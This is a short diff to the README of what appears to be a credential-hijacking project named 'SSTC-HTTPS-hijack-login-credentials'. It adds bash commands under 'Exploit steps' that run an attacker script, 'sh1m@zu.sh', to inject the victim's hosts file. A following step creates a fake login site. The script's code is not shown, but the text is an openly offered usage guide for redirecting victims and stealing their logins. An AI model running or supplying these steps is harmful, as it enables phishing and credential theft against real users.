@@ -22,7 +22,11 @@ $ pip install -r requirements.txt
 # Exploit steps:
 
 1. - Injecting the hosts file of the victim:
-```
+```bash
+cd SSTC-HTTPS-hijack-login-credentials/Attacker/sh1mazu_https_fake
+bash sh1m@zu.sh
+[1]
+     enter
 ```
 
 2. - Creating hosts exploit fakesite.login.com
